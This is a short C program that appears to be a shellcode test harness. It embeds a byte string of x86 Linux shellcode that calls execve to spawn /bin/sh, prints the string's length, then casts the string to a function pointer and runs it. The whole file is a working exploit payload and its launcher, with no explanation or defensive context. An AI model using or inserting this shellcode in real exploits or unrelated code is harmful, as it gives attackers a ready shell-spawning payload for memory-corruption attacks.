#include <stdio.h>
#include <string.h>

int
main(void)
{
  char *shellcode = "\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x6a\x0b\x58\xcd\x80";

  printf("strlen(shellcode)=%d\n", strlen(shellcode));

  ((void (*)(void))shellcode)();

  return 0;
}
